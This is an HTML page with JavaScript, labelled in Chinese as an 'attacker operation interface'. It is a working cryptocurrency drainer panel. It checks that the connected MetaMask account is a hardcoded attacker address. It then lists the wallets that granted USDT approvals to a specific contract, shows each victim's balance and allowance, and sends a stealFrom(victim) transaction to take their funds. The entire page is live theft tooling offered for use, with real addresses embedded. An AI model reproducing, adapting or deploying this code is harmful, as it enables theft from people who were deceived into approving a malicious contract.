
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>🛠️ 攻擊者操作介面 v3.1.9（✅安全限制版）</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: 'Arial'; padding: 20px; background: #fff; }
    .ok { color: green; }
    .bad { color: red; }
  </style>
</head>
<body>
  <h2>🛠️ 攻擊者操作介面 v3.1.9（✅安全限制版）</h2>
  <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
  <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
  <br>
  <input id="input" placeholder="受害者地址" />
  <button onclick="steal()">執行盜取</button>
  <p id="balance"></p>
  <p id="status">等待操作...</p>
  <p id="refresh" style="color: gray; font-size: 12px;"></p>
  <h3>📌 授權地址列表：</h3>
  <ul id="victims"></ul>

  <script>
    const CONTRACT = "0xFbe9c4748A267562f723C67db673943F901533D6";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const ATTACKER = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const ABI = [
      "event Approval(address indexed owner,address indexed spender,uint256 value)",
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    let provider, signer, attacker;

    async function connect() {
      if (!window.ethereum) return alert("請安裝 MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      attacker = await signer.getAddress();
      document.getElementById("account").innerText = attacker;
      if (attacker.toLowerCase() === ATTACKER.toLowerCase()) {
        document.getElementById("auth").innerText = "你是攻擊者本人";
        document.getElementById("auth").className = "ok";
      } else {
        document.getElementById("auth").innerText = "❌ 非授權攻擊者";
        document.getElementById("auth").className = "bad";
      }
      fetchApprovals();
    }

    async function fetchApprovals() {
      document.getElementById('refresh').innerText = '🔄 正在刷新授權列表...';
      const contract = new ethers.Contract(USDT, ABI, provider);
      const events = await contract.queryFilter(
        contract.filters.Approval(null, CONTRACT),
        19000000
      );
      const ul = document.getElementById("victims");
      ul.innerHTML = "";
      document.getElementById('refresh').innerText = '✅ 已更新 ' + new Date().toLocaleTimeString();
      const addresses = new Set();
      events.reverse().forEach(ev => {
        if (!addresses.has(ev.args.owner)) {
          addresses.add(ev.args.owner);
          const li = document.createElement("li");
          li.innerText = ev.args.owner;
          ul.appendChild(li);
        }
      });
    }

    async function steal() {
      const victim = document.getElementById("input").value;
      const current = await signer.getAddress();
      if (current.toLowerCase() !== ATTACKER.toLowerCase()) {
        document.getElementById("status").innerText = "❌ 此帳號不是授權攻擊者，禁止操作";
        return;
      }
      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
      const data = iface.encodeFunctionData("stealFrom", [victim]);
      const tx = { to: CONTRACT, data: data };
      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
      try {
        const sent = await signer.sendTransaction(tx);
        document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
      }
    }

    document.getElementById("input").addEventListener("input", async (e) => {
      const val = e.target.value;
      if (ethers.utils.isAddress(val)) {
        try {
          const contract = new ethers.Contract(USDT, ABI, provider);
          const balance = await contract.balanceOf(val);
          const allowance = await contract.allowance(val, CONTRACT);
          document.getElementById("balance").innerText = "💵 USDT: " + balance.toString() +
            "
🪪 Allowance: " + allowance.toString();
        } catch {
          document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式正確";
        }
      } else {
        document.getElementById("balance").innerText = "";
      }
    });

    connect();
    setInterval(fetchApprovals, 10000);
  </script>
</body>
</html>
